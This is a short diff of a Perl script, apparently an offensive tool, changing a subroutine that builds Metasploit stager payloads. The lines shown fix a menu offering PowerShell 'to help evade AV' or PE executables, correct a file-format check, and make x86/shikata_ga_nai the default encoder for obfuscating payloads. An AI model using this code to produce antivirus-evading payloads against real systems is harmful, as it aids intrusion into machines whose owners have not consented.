@@ -104,7 +104,7 @@ sub metasploit
 	}
 	my $fileformat = "";
 	print "[+] Which file format you want to use?\n";
-	print "    1: Powershell (helps evading AV)\n     2: PE executable (works on older servers)\n";
+	print "    1: Powershell (helps evading AV)\n    2: PE executable (works on older servers)\n";
 	while (($fileformat !=1) and ($fileformat != 2)) {
 		print "> ";
 		$fileformat = <STDIN>;
@@ -179,9 +179,12 @@ sub metasploit
 		$stagertype = "psh";
 	}
 	# Now, it seems that you need msfencoder to use Powershell...
-	if (($conf->{'msfencoder'} eq "") and ($fileformat eq "exe")) {
+	if (($conf->{'msfencoder'} eq "") and ($fileformat eq ".exe")) {
 		$command .= " X > /tmp/".$stager;
 	} else {
+		if ($conf->{'msfencoder'} eq "") {
+			$conf->{'msfencoder'} = "x86/shikata_ga_nai";
+		}
 		$command .= " R | ".$msfencode.
 			    " -e ".$conf->{'msfencoder'}.
 			    " -c ".$conf->{'msfencodecount'}.
